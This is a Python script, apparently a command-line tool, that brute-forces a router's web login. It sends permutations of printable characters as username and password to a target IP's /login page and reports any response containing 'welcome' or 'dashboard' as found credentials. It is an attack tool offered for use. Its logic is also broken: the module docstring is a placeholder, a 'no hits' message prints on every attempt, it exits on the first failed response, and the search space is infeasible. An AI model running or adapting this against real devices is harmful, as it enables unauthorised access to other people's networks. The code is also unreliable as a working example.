"""
Explain vulnerability
"""

from argparse import ArgumentParser
from itertools import permutations
from string import printable

from requests import RequestException, post


def check_for_cred(ip: str, min_len: int, max_len: int):
    """
    Tries to brute force credentials using permutations of the following string:
    0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&'()*+,-./:;<=>?@[\\]^_`{|
    """
    print("# Brute forcing for credentials...")

    no_hits = True
    for i in range(min_len, max_len + 1):
        for user_perm in permutations(printable, i):
            for pass_perm in permutations(printable, i):
                user_perm = "".join(user_perm)
                pass_perm = "".join(pass_perm)
                try:
                    res = post(
                        f"http://{ip}/login",
                        data={"username": user_perm, "password": pass_perm},
                        timeout=5,
                    )
                    if not res:
                        return

                    # Somtimes routers display "Welcome, Admin". Reason behind welcome
                    if "welcome" in res.text.lower():
                        print(f"- *Credential found!: {user_perm}:{pass_perm}*")
                        no_hits = False

                    # Checks for status code 200
                    elif res.status_code == 200 and "dashboard" in res.text.lower():
                        print(f"- *Credential found!: {user_perm}:{pass_perm}*")
                        no_hits = False

                except RequestException:
                    continue

                if no_hits:
                    print("- No hits when brute forcing credentials")
                print()


if __name__ == "__main__":
    parser = ArgumentParser(prog="brute_force_creds")
    parser.add_argument("-ip", action="store", type=str)
    parser.add_argument("-min", action="store", type=int, default=6, required=False)
    parser.add_argument("-max", action="store", type=int, default=15, required=False)
    args = parser.parse_args()
    check_for_cred(args.ip, args.min, args.max)
